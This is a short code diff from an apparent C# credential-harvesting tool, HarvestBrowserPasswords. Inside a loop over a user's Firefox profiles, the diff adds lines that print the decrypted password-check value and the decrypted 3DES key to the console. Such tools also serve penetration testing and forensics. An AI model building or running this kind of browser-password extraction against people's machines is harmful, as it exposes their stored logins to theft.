@@ -95,12 +95,16 @@ namespace HarvestBrowserPasswords
             foreach (string profile in FindFirefoxProfiles(userAccountName))
             {
                 FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile);
-                
+
                 //Conduct Password check
+                Console.ForegroundColor = ConsoleColor.Yellow;
 
+                Console.WriteLine($"Cleartext Password: {Encoding.ASCII.GetString(decryptor.DecryptedPasswordCheck)}");
                 //Decrypt 3DES key
-
+                Console.WriteLine($"3DES key:           {BitConverter.ToString(decryptor.Decrypted3DESKey)}");
                 //Decrypt Logins
+
+                Console.ResetColor();
             }
         }
 
